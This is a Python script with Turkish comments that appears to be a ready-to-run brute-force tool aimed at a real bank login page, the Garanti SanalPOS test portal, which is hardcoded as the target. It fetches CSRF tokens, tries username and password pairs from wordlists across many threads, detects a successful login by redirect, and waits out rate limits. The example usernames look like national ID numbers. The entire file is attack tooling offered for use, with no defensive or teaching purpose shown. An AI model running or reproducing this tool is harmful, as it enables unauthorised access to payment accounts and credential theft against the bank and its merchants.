#!/usr/bin/env python3
# garanti_bruteforce.py

import requests
import threading
import time
import sys
from urllib.parse import urljoin
import re

class GarantiBruteforce:
    def __init__(self, target, username_file, password_file, threads=10):
        self.target = target
        self.username_file = username_file
        self.password_file = password_file
        self.threads = threads
        self.found = False
        self.attempts = 0
        self.start_time = time.time()
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': self.target
        })
    
    def get_csrf_token(self):
        """Login sayfasından CSRF token al"""
        try:
            response = self.session.get(self.target, timeout=10)
            # CSRF token'ı bul
            match = re.search(r'name="_csrf"\s+value="([^"]+)"', response.text)
            if match:
                return match.group(1)
            return None
        except Exception as e:
            print(f"[!] CSRF token alınamadı: {e}")
            return None
    
    def attempt_login(self, username, password):
        """Login denemesi yap"""
        try:
            # CSRF token al
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                return False
            
            # Login data
            data = {
                '_csrf': csrf_token,
                'username': username,
                'password': password,
                'encryptedPassword': ''  # Normalde şifreli gönderilir ama basit test için
            }
            
            # POST isteği
            response = self.session.post(
                self.target,
                data=data,
                timeout=10,
                allow_redirects=False
            )
            
            self.attempts += 1
            
            # Başarı kontrolü
            # Başarılı login genelde redirect (302) veya başka sayfaya yönlendirir
            if response.status_code == 302 or 'dashboard' in response.text.lower():
                return True
            
            # Hata mesajı kontrolü
            if 'Hatalı giriş' in response.text or 'alert-danger' in response.text:
                return False
            
            # Rate limiting kontrolü
            if response.status_code == 429 or 'too many' in response.text.lower():
                print(f"\n[!] Rate limit! 5 saniye bekleniyor...")
                time.sleep(5)
                return False
            
            return False
            
        except Exception as e:
            print(f"\n[!] Hata: {e}")
            return False
    
    def brute_worker(self, username, passwords):
        """Tek kullanıcı için şifre dene"""
        for password in passwords:
            if self.found:
                break
            
            success = self.attempt_login(username, password)
            
            if success:
                self.found = True
                print(f"\n\n[+] BAŞARILI!")
                print(f"[+] Kullanıcı: {username}")
                print(f"[+] Şifre: {password}")
                print(f"[+] URL: {self.target}\n")
                return
            
            elapsed = time.time() - self.start_time
            rate = self.attempts / elapsed if elapsed > 0 else 0
            print(f"\r[*] Deneme: {self.attempts} | Rate: {rate:.2f}/s | Test: {username}:{password[:20]}...", end='')
            
            time.sleep(0.5)  # Rate limit için
    
    def start(self):
        print(f"[+] Garanti SanalPOS Bruteforce")
        print(f"[+] Target: {self.target}")
        print(f"[+] Username file: {self.username_file}")
        print(f"[+] Password file: {self.password_file}")
        print(f"[+] Threads: {self.threads}\n")
        
        # Dosyaları oku
        try:
            with open(self.username_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            with open(self.password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Dosya okuma hatası: {e}")
            return
        
        print(f"[+] {len(usernames)} kullanıcı, {len(passwords)} şifre yüklendi")
        print(f"[+] Toplam deneme: {len(usernames) * len(passwords)}\n")
        
        # Her kullanıcı için thread başlat
        threads = []
        for username in usernames:
            if self.found:
                break
            
            t = threading.Thread(target=self.brute_worker, args=(username, passwords))
            t.start()
            threads.append(t)
            
            # Thread limiti
            while len([t for t in threads if t.is_alive()]) >= self.threads:
                time.sleep(0.1)
        
        # Tüm thread'lerin bitmesini bekle
        for t in threads:
            t.join()
        
        if not self.found:
            print(f"\n\n[!] Başarılı login bulunamadı")
            print(f"[!] Toplam deneme: {self.attempts}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 garanti_bruteforce.py <username_file> <password_file> [threads]")
        print("\nExample:")
        print("  python3 garanti_bruteforce.py users.txt pass.txt 5")
        print("\nFile format (one per line):")
        print("  users.txt: 12345678901, 98765432109, ...")
        print("  pass.txt: password123, 12345678, admin, ...")
        sys.exit(1)
    
    target = "https://sanalpostest.garanti.com.tr/web/login"
    username_file = sys.argv[1]
    password_file = sys.argv[2]
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    brute = GarantiBruteforce(target, username_file, password_file, threads)
    brute.start()
